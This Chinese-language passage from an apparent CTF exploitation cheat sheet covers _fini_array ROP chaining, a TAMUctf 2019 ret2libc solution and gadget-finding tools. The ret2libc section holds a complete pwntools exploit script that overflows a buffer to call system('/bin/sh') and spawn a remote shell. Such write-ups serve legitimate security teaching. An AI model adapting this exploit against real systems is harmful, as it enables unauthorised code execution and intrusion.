用 `add rsp, N; ret` 迁移向下走过当前 `rsp`，让每个阶段都拼接在上一个 ROP 帧之后。

**关键点：** 在静态二进制中，`_fini_array` 实际上是一张可重入回调表。两个条目加上任何“写 N 字节到 addr”的原语，就能在不重启进程的情况下获得无限 ROP 深度。

**参考：** Insomnihack teaser 2019 — onewrite，writeup 12912

---

<a id="ret2libc-via-statically-linked-libc--embedded-binsh-string-tamuctf-2019"></a>
## 静态链接 libc + 内嵌 /bin/sh 字符串的 ret2libc（TAMUctf 2019）

**模式（pwn5）：** 参数被拷贝进固定大小的缓冲区，且*显示*上限为 3 个字符——但底层 `gets()` 仍会读入整行，造成越过缓冲区 17 字节的栈溢出。溢出槽太小放不下多 gadget 的 ROP 链，且可预测地址处没有明显的 `/bin/sh`。由于程序是**静态链接**，`system`、`exit` 以及 libc 代码块中内嵌的 `"/bin/sh"` 字符串都位于固定地址——一次 ret2libc 调用就能放进溢出槽。

```python
from pwn import *

# Addresses resolved from the static binary itself:
#   (gdb) info address system  -> 0x0804ee30
#   (gdb) info address exit    -> 0x0804e330
#   0x080bc140: "/bin/sh"              (pulled from rodata / libc blob)

system  = 0x0804ee30
exit_a  = 0x0804e330
binsh   = 0x080bc140

# Overflow reaches saved EIP at cyclic offset 17 (cyclic -l on the crash)
payload  = cyclic(17)
payload += p32(system)   # ret -> system
payload += p32(exit_a)   # system's return addr -> exit (avoid SIGSEGV post-shell)
payload += p32(binsh)    # system's first arg

# Keep the process alive after the shell spawns by piping stdin:
# (python -c "..."; cat) | nc pwn.tamuctf.com 4325
io = remote('pwn.tamuctf.com', 4325)
io.sendline(payload)
io.interactive()
```

**关键点：** 静态链接会把每个 libc 符号变成程序内的固定偏移目标，并免费带上整张 libc 字符串表（包括 `"/bin/sh"`）——无需泄漏、无需用 ROPgadget 找 `/bin/sh`、无需动态链接器游戏。只要 `checksec` 显示“无 PIE”且 `file` 报告“statically linked”，一个 12 字节的载荷（`system; exit; &/bin/sh`）通常就够了，即使溢出窗口小到放不下 2 个 gadget 的链。用 `strings -a binary | grep -n /bin/sh` 与 `nm binary | grep ' T system'` 确认。

**参考：** TAMUctf 2019 — pwn5，writeup 13428

---

<a id="useful-commands"></a>
## 常用命令

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```
